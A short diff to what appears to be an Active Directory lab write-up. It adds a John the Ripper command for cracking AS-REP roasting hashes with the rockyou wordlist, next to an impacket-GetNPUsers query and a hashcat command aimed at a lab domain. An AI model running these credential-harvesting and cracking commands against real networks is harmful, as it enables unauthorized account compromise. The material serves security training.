@@ -229,6 +229,7 @@ impacket-GetNPUsers canozkan.local/ -dc-ip 192.168.56.108 -usersfile users.txt
 
 ```bash
 hashcat -m 18200 hashes.txt wordlist.txt
+sudo john --format=krb5asrep asrep_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 ---
